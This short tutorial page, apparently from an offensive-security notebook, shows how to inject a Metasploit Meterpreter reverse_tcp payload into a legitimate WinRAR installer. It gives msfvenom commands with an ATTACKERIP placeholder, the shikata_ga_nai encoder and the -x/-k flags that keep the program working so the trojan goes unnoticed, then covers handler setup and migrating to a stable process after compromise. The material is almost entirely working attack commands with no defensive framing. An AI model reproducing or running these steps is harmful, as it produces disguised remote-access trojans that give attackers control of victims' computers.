# Injecting Payloads Into Windows Portable Executables

## Practical Demo

&#x20;WinRar is very good to inject payloads into.

### Generating and injecting the payload

&#x20;Download the WinRar 32-bit executable from the website

* "<mark style="color:yellow;">msfvenom -p /windows/meterpreter/reverse\_tcp LHOST=ATTACKERIP LPORT=PORT -e x86/shikata\_ga\_nai -i 10 -f exe -x 'specifywinrarexe > 'nameoffile.extension'</mark>"

#### Setting up the multi/handler

* "<mark style="color:yellow;">use multi/handler</mark>"

Set the payload to the same as the created payload

<mark style="color:purple;">NOTE:</mark> You can keep the original functionality of the used executable with the flag "<mark style="color:red;">-k</mark>".

After getting a meterpreter session in the target machine run the module <mark style="color:red;">post/windows/manage/migrate</mark>, to migrate to a more stable process.

* <mark style="color:yellow;">run post/windows/manage/migrate</mark>

### Maintaining the functionality of the portable executable

<mark style="color:yellow;">msfvenom -p /windows/meterpreter/reverse\_tcp LHOST=ATTACKERIP LPORT=PORT -e x86/shikata\_ga\_nai -i 10 -f exe -x -k 'specifywinrarexe > 'nameoffile.extension'</mark>

<mark style="color:purple;">NOTE:</mark> Most portable executables don't work with this flag
